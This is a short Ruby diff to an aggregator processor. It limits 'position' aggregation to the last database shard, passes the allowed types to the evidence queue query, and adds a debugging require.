@@ -11,7 +11,7 @@ require 'fileutils'
 
 require_relative 'peer'
 require_relative 'position'
-
+require 'pry'
 module RCS
 module Aggregator
 
@@ -19,11 +19,18 @@ class Processor
   extend RCS::Tracer
 
   def self.run
+
+    # check if we are the last shard and enable the position aggregation
+    # we use this technique to avoid conflicts between multiple positioner
+    enable_position = RCS::DB::Shard.last == RCS::DB::Config.instance.global['SHARD']
+    types = AggregatorQueue::AGGREGATOR_TYPES
+    types.delete('position') unless enable_position
+
     # infinite processing loop
     loop do
       # get the first entry from the queue and mark it as processed to avoid
       # conflicts with multiple processors
-      if (queued = AggregatorQueue.get_queued)
+      if (queued = AggregatorQueue.get_queued(types))
         entry = queued.first
         count = queued.last
         trace :info, "#{count} evidence to be processed in queue"
